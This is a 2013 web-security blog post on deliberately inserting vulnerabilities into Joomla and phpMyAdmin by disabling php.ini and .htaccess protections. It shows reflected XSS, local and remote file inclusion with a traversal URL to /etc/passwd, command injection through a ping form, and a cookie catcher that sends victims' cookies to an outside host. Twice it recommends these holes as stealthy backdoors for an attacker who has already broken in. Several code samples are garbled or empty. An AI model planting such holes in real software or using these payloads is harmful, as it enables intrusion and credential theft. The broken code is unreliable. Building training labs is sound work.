---
layout: post
title: "Inserting Vulnerabilities in Web Applications"
date: 2013-06-13 20:43
comments: true
categories: web-application-security security
---

In this article we will look at how we can insert vulnerabilities in web applications. Why? There are basically two reasons. Firstly, because it allows us to see the application from the eyes of a web developer and not a hacker. Secondly, because it allows us to create a platform where we can create a set of vulnerable web applications, and fuse them all together in a Virtual machine. So now, several people can test their web application security skills on the VM and learn from it. Some of the other reasons might be to leave a backdoor onto the server once the attacker has got access. Some of the backdoors could be very easily found out as they stand apart from the rest of the applications, but if the web application itself has been made vulnerable instead, then its a bit tough to detect it.

<!--more-->

In this article we will be looking at some of the Open Source Web Applications, for e.g Joomla, phpMyAdmin etc, see what mechanisms the developers use to protect these application from OWASP Top 10 Web Application Vulnerabilities, and then look at how we can change the code to make the application vulnerable.

The first and foremost thing to do is to change some of the configurations in the _php.ini_ file of your server. There are some configurations in this file that may protect the web application from being exploited. In my case the php.ini was located in the location _/etc/php.ini_. In your case it might be different. Instead of changing the configuration of your main _php.ini_ file, you can instead make a custom _php.ini_ file in your web application which could overwrite the settings in the main _php.ini_ file, though this may not work all the time. Hence we will go with editing the main _php.ini_ file. Open up your _php.ini_ file and make sure the following settings match with your php.ini file.

<pre>safe_mode = Off</pre>

The safe mode is used to prevent your server from getting exploited by blocking some of the dangerous functions like shell execution in php etc. According to [php.net](http://php.net), this feature has been DEPRECATED as of PHP 5.3.0\.

<pre>register_globals = On</pre>

This setting allows the modification of global variables from the URL. For e.g if the url is _http://infosecinstitute.com?q=infosec_ then this means that the value of "q" can be changed depending upon the URL (in this case it is "infosec"). In case of a different url say _http://infosecinstitute.com?q=test_, the value of q will be "test". Hence it can be modified by just changing the URL. We will see later how this helps us while inserting File Inclusion vulnerabilities.

<pre>allow_url_fopen = On</pre>

This options allows the treatment of URL's as files.

<pre>allow_url_include = On</pre>

This option uses the function include, include_once, require, require_once to open URL's as files.

<pre>magic_quotes_gpc = Off</pre>

This disables the feature of php where it tries to escape any malicious characters which might corrupt the data or might perform an injection attack.

<pre>file_uploads = On</pre>

This allows the use of HTTP file uploads

<pre>display_errors = On</pre>

This feature allows the server to display errors. Though this might be a useful setting while development but it should not be set to ON once the web application is live. This is because the errors might leak sensitive information about the web application.

Once you have made these changes, save the _php.ini_ file (make sure that it is writable). Restart the server to make the changes come into effect.

![First]({{site.baseurl}}/images/posts/insvul/first.png)

The next step is to download Joomla, which is an open source Content Management System. Joomla can be downloaded from [here.](http://www.joomla.org/download.html) Once it is downloaded, install in on your system and remove the installation directory. Once all of these steps are done, the Joomla home page should look like this.

![1]({{site.baseurl}}/images/posts/insvul/1.png)

Let's go the Joomla directory and analyze the code. The joomla directory has a .htaccess file. Let's see what are the configurations in it. Open up the .htaccess file .

![2]({{site.baseurl}}/images/posts/insvul/2.png)

As we can see that their is a lot of interesting stuff here. Let's analyze them one by one.

![3]({{site.baseurl}}/images/posts/insvul/3.png)

This code is used to stop someone from using base64 encoding to perform attacks like script execution, login bypass etc.

![3]({{site.baseurl}}/images/posts/insvul/4.png)

Protection against Cross Site Scripting.

![5]({{site.baseurl}}/images/posts/insvul/5.png)

Protection against various types of Inclusion attacks like Local file inclusion and Remote file inclusion

![6]({{site.baseurl}}/images/posts/insvul/6.png)

Protection against File Inclusion attacks like Local file inclusion and Remote file inclusion and also SQL Injection to some extent. This is because the attacker might modify the parameters sent via GET or POST Request.

![7]({{site.baseurl}}/images/posts/insvul/7.png)

In case the user tries to browse somewhere he doesn't have access to.

Now we know what to do. In order to insert vulnerablities into Joomla, these rules should not be there. Comment out these rules so that the file appears like this.

![8]({{site.baseurl}}/images/posts/insvul/8.png)

**1) Inserting Reflected XSS (Cross Site Scripting)**

Let's say we add the following code to index.php file in Joomla

``` php $name = $_GET['name']; if(isset($name)) { print "Welcome, ".$name; } else { print "Welcome, User "; } ```

The Joomla main page takes a name parameter in it's url and displays a welcome message at the top of the main page as shown in the figure below.

![9]({{site.baseurl}}/images/posts/insvul/9.png)

We are right now not sure if the application is vulnerable to Cross Site Scripting, but we know that there is a possibility because the parameter we pass in the url is displayed in the main page without validating it. We also removed the checks for the _script_ tag previously. Hence if we input some script as the parameter and it gets executed, then we know that it is definitely a vulnerability.

Let's enter the following url in the input

<pre>http://127.0.0.1/Joomla/index.php?name=%3Cscript%3Ealert%28%22This%20is%20definitely%20a%20vulnerability%22%29;%3C/script%3E</pre>

![10]({{site.baseurl}}/images/posts/insvul/10.png)

The script gets executed and we are shown an alert. Hence we can confirm that we just inserted a XSS vulnerability in the application.

**2) Inserting LFI (Local File Inclusion) and RFI (Remote File Inclusion)**

Local file inclusion occur when it is possible to include a file on the server from the URL and see the content inside it. In this case, we will be inserting an LFI vulnerability in Joomla.

Joomla allows us to create components, in this case we will be creating a custom component. To do this just make a folder named com_COMPONENTNAME in the components folder. In this case our component name would be _com_infosec_.

![11]({{site.baseurl}}/images/posts/insvul/11.png)

Copy all the files from any component and rename it according to the current component, i.e infosec. Once this is done, add the following code in it's infosec.php file.

``` php if (isset($_REQUEST["imp_file"])){ $imp_file = $_REQUEST["imp_file"]; } require_once($imp_file); ```

Note that we could have used the code _include_once_ too. The only difference between them is that _include_once_ will show an error in case the file is not found while _require_once_ won't. From the code it is very clear that the infosec.php will take a file name as the parameter and then include it in the webpage. Since it is possible to modify the request variables because of the settings we changed earlier, it is possible to include any file from the server and display it in the browser. Let's try and display the /etc/passwd file.

Go to the following url:

<pre>http://127.0.0.1/Joomla/index.php?option=com_infosec&name=InfosecInstitute&imp_file=../../../../../etc/passwd</pre>

![13]({{site.baseurl}}/images/posts/insvul/13.png)

As we can see that we get a dump of the _/etc/passwd_ file of the server. Note that the number of _"../"_ might be different in your case. Hence we have successfully inserted a local file inclusion vulnerability in the web application. Please note that this is also a Remote file Inclusion vulnerability. Let's try and load up google.com on the Joomla home page.

Go to the following url:

<pre>http://127.0.0.1/Joomla/index.php?option=com_infosec&name=InfosecInstitute&imp_file=http://google.com</pre>

![14]({{site.baseurl}}/images/posts/insvul/14.png)

We just successfully loaded a remote url on Joomla's web page. Imagine the consequences of such a vulnerability. It is now possible to execute any remote script present anywhere on the web on the victim.

Please note that sometimes the code which is responsible for including the file could be like this

<pre>include($FilePath.'.php');</pre>

This means that the argument is appended with ".php" and that file name is then included. In this case our previous url will not work because of the extra ".php" after it. However its effect can be nullified by adding the null byte _"%00"_ after the url. This escapes all the stuff after the null byte.

Hence in this case our url would be..

<pre>http://127.0.0.1/Joomla/index.php?option=com_infosec&name=InfosecInstitute&imp_file=http://google.com%00codeDoesntGoHere</pre>

**3) Inserting Information Disclosure vulnerability**

Almost all the web applications have some sort of configuration file. In Joomla, it goes by the name _"configurations.php"_ and is located in its root directory. Some developers like to keep a backup for their configuration file. The usual norm is to keep it by the extension _".bak"_. Hence the backup file for the configuration file _"configurations.php"_ would be named as "configurations.php.bak". However their is a security issue with this. A bak file when accessed from the browser via url will prompt for a download of the file. Hence any user from outside can download the configuration file and hence see all the settings like username, password for Joomla. This needs some guess work from the attacker's side, though it can also be done by the use of automated tools. The .bak file looks something like this.

![Config File]({{site.baseurl}}/images/posts/insvul/config_file.png)

As we can see, a lot of things like the Username, Password for the administrator are clearly visible in the configuration file. Disclosure of the configuration file can lead to complete compromise of the web application.

Sometimes the admin might need to store his password or some other confidential information in a file on the server, but may not want other users to access it, so he puts it in a directory and gives it a wierd name 21lnkqasdsacnd1eqwdn22qwd2wd. To protect the directory from google and other search engines he modifies the _robots.txt_ file as shown to disallow web crawlers to index that directory. But the problem is that the robots.txt file is world readable and hence the attacker can figure out the name of the directory once he browses to the _robots.txt_ file. When we browse to the robots.txt file for Joomla we get something like this.

![16]({{site.baseurl}}/images/posts/insvul/16.png)

We now know that the admin is protecting something from the web crawlers, a folder with a weird name _21lnkqasdsacnd1eqwdn22qwd2wd_. Let's check it out.

![17]({{site.baseurl}}/images/posts/insvul/17.png)

The _password.txt_ file is available for anyone to view. Some developers think that the _robots.txt_ file is used for hiding subdomains and directories.But in actual it is used to provide direction to web crawlers about what publicly available information should and should not be indexed. Hence if a directory is non-public, then it should not be linked anywhere on the site and it should not be included in robots.txt, because that essentially makes it public. If it is not linked, there is no reason to include it in the robots.txt in the first place.

**4)Inserting CSRF (Cross Site Request Forgery) Vulnerability**

CSRF occurs when an attacker is able to have the victim user make a request to a trusted site (to which he is already authenticated) on behalf of the victim without his knowledge. Some developers think that allowing the victim to submit only POST Requests or using a secret cookie will prevent the victim from CSRF. But this is not true as the cookie will be submitted with every request the victim makes to the trusted website. Also it is very trivial for the attacker to have the victim submit a POST request which can be done by having a secret form on the attacker's website which would be submitted to the trusted website on behalf of the victim.

There are some ways to prevent CSRF. One of them is to have a secret token and have it submitted with each request the client makes to the trusted website, either in the URL or in the header. Also this token should have a timeout value after which it should expire and a new token is generated for the user. One of the other ways is to have the authentication data submitted with important requests, for e.g wire transfer, password change etc. Note that in this case the attacker won't have access to the user's credentials and hence won't be able to perform this attack. Inserting a CSRF is hence quite easy. We just need to remove all the checks that prevent CSRF, i.e remove the checking of tokens, authentication data etc. More information about CSRF can be found [here](http://en.wikipedia.org/wiki/Cross-site_request_forgery).

For inserting the next two vulnerabilities we are going to use the web application _phpMyAdmin_. More information on phpMyAdmin and to know the steps to install it, click [here](http://www.phpmyadmin.net/documentation/).

**5) Inserting Reflected XSS (Cross Site Scripting) vulnerabilities**

Let's assume for one moment that phpmyadmin is an application used by many users and it has just one admin. The admin wants to provide a functionality in a page message.html _http://site-IP/phpmyadmin/message.html_ that allows any user to post a message to the administrator. The message is passed to a file message.php which writes it to a file text.html without validating the message. The admin can then view all the message by just going to the _text.html_ page. So if an attacker can inject malicious code in the message field then that code would execute on the admin's machine once the admin opens up the text.html page. This vulnerability is called Reflected XSS (Cross Site Scripting). Also, by using the same technique the attacker can steal the admin's cookies. The attacker could use a cookie catcher located somewhere on the web which takes a variable _'c'_. We pass the variable _c_ as document.cookie (i.e the user's cookie) to the _Cookie Catcher_ file (note that we must know the location of the cookie catcher file), for e.g if the Cookie Catcher file URL is _http://infosecinstitute.com/cookie_catcher.php_ then the request that we will send from the client machine through XSS is _http://infosecinstitute.com/cookie_catcher.php?c=USER_COOKIE_. The USER_COOKIE is the cookie we fetch through javascript.This file then writes the Cookie and other values to a file named _user_info.html_.

Code for "message.html", the message to the admin is sent from here

``` php POST YOUR MESSAGE TO ADMIN HERE !

<form action="message.php" method="get"><input type="text" name="c"></form>

```

Code for "message.php", once the message is sent, this code stores the message in a file named text.html

``` php IP: ' .$ip. '  
Date and Time: ' .$date. '  
Referer: '.$referer.'  

'); fclose($fp); //Redirect the user to google.com header ("Location: http://www.google.com"); ?> ```

Code for "Cookie Catcher file". Note that this file should be stored somewhere on the internet, we call the url of the file with an argument "c" in which we pass the cookie. This file then takes the cookie and other information and writes all the values into a file named "user_info.html".

``` php IP: ' .$ip. '  
Date and Time: ' .$date. '  
Referer: '.$referer.'  

'); fclose($fp); //Redirect the user to google.com header ("Location: http://www.google.com"); ?> ``` **5) Inserting Remote Command Execution vulnerability**

Phpmyadmin comes with a footer.php file where we can write code which should appear at the bottom of every page in the application. In this case the admin allows the user to ping any server in the world by running the ping command on his server but not filtering out the input properly. So if the attacker inputs something like this _"127.0.0.1 ; ls" OR "127.0.0.1 ; cat /etc/passwd"_ he can run these commands on the remote webserver and see the output too.

Here is how the footer appears in phpMyAdmin

![PhpRemoteExexVuln]({{site.baseurl}}/images/posts/insvul/phpRemoteExexVuln.png)

Once we click on submit, the output result looks like this. We can easily deduce that we now have the ability to execute remote commands on the server.

![RemoteExecResult]({{site.baseurl}}/images/posts/insvul/remoteExecResult.png)

Here is the code for the file "config.footer.inc.php"

``` php

# Find which server is online anywhere in the world

Enter an IP address of the server below:

<form name="ping" action="ping.php" method="post"><input type="text" name="ip" size="30"> <input type="submit" value="submit" name="submit"></form>

```

Here is the code for the file "ping.php"

``` php ```

## Conclusion

In this article we looked at how we can insert vulnerabilities in web applications. We took some of the popular open source applications like Joomla and phpMyAdmin as the example, learnt how it protected itself from various common exploits and then bypassed those protection mechanisms to make the application vulnerable. Inserting vulnerabilities can be useful for many reasons, a company might want to set up a test environment for it's users to test their Web Application Security skills, or because an attacker who has already broken into the web application might want to leave a backdoor so that he can get access later. Hence, instead of leaving behind a standalone backdoor which stands apart from all the web applications on the server and could be easily detected , inserting a vulnerability in a web application is a much better option because of the stealth involved in this case.

## References:

*   PHP: The configuration file - Manual  
    http://php.net/manual/en/configuration.file.php

*   Cross-site_request_forgery  
    http://en.wikipedia.org/wiki/Cross-site_request_forgery

This article was originally published on the [resources](http://resources.infosecinstitute.com/) page at [Infosec Institute](http://infosecinstitute.com/). For more information, please visit my author [page](http://resources.infosecinstitute.com/author/prateek/).